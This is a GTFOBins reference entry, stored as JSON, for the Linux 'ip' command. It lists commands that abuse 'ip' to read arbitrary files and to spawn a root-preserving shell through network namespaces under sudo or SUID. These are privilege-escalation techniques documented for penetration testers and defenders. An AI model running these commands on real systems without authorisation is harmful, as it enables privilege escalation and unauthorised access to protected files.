{"title": "ip", "source": "gtfobins", "source_label": "GTFOBins", "path": "ip", "html": "<h1>ip</h1>\n<h2>File Read</h2>\n<p>The read file content is corrupted by error prints.</p>\n<pre><code class=\"language-bash\">ip -force -batch /path/to/input-file</code></pre>\n<h2>Shell</h2>\n<pre><code class=\"language-bash\">ip netns add foo\nip netns exec foo /bin/sh\nip netns delete foo</code></pre>\n<p><strong>SUID override:</strong></p>\n<pre><code class=\"language-bash\">ip netns add foo\nip netns exec foo /bin/sh -p\nip netns delete foo</code></pre>\n<pre><code class=\"language-bash\">ip netns add foo\nip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar\nip netns exec bar /bin/sh\nip netns delete foo\nip netns delete bar</code></pre>", "excerpt": "ip File Read The read file content is corrupted by error prints. ip -force -batch /path/to/input-file Shell ip netns add foo ip netns exec foo /bin/sh ip netns delete foo SUID override: ip netns add foo ip netns exec foo /bin/sh -p ip netns delete…", "tags": ["func:file-read", "func:shell", "ctx:sudo", "ctx:suid", "ctx:unprivileged"]}